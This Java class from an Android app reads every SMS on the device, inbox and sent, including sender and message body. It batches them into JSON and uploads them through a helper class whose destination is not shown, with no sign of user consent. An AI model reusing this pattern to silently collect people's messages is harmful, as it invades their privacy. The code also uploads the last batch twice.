package com.ahv.allakumarreddy.andro1message;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Date;

/**
 * Created by alla.kumarreddy on 5/15/2017.
 */

public class SmsLog extends AsyncTask<String, String, String> {

    private JSONArray jsonArray = null;
    private final String className = "sms";
    private Context context;

    public SmsLog(Context context) {
        this.context = context;
        jsonArray = new JSONArray();
    }

    public String getSms() {
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = context.getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        int totalSMS = c.getCount();

        new ErrorCus("Total SMS count : " + totalSMS);
        if (c.moveToFirst()) {
            int i, j;
            for (i = 0, j = 0; i < totalSMS; i++, j++) {
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    this.addJSONData(c.getString(c.getColumnIndexOrThrow("_id")), c.getString(c.getColumnIndexOrThrow("address")), c.getString(c.getColumnIndexOrThrow("body")), c.getString(c.getColumnIndex("read")), new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date")))).toString(), "inbox");
                } else {
                    this.addJSONData(c.getString(c.getColumnIndexOrThrow("_id")), c.getString(c.getColumnIndexOrThrow("address")), c.getString(c.getColumnIndexOrThrow("body")), c.getString(c.getColumnIndex("read")), new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date")))).toString(), "sent");
                }
                c.moveToNext();
                if (j == 500) {
                    j = 0;
                    this.uploadJSONData();
                    jsonArray = new JSONArray();
                    publishProgress("count " + i);
                }
            }
            if (j != 0)
                this.uploadJSONData();
        } else {
            publishProgress("You have no SMS");
        }
        c.close();
        return "1";
    }

    public void addJSONData(String id, String address, String msg, String readState, String time, String folderName) {
        JSONObject obj = new JSONObject();
        try {
            obj.put("id", id);
            obj.put("address", address);
            obj.put("msg", msg);
            obj.put("state", readState);
            obj.put("time", time);
            obj.put("fname", folderName);
        } catch (JSONException e) {
            publishProgress(e.getMessage());
        }
        jsonArray.put(obj);
    }

    public void uploadJSONData() {
        new HttpData(jsonArray.toString());
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected String doInBackground(String... params) {
        return this.getSms();
    }

    @Override
    protected void onPostExecute(String response) {
        super.onPostExecute(response);
        if (response != null) {
            //SUCCESS
            this.uploadJSONData();
        } else {
            //NO SUCCESS
            new ErrorCus(className + ":" + "Error!");
        }
    }

    @Override
    protected void onProgressUpdate(String... text) {
        new ErrorCus(className + ":" + text[0]);
    }
}
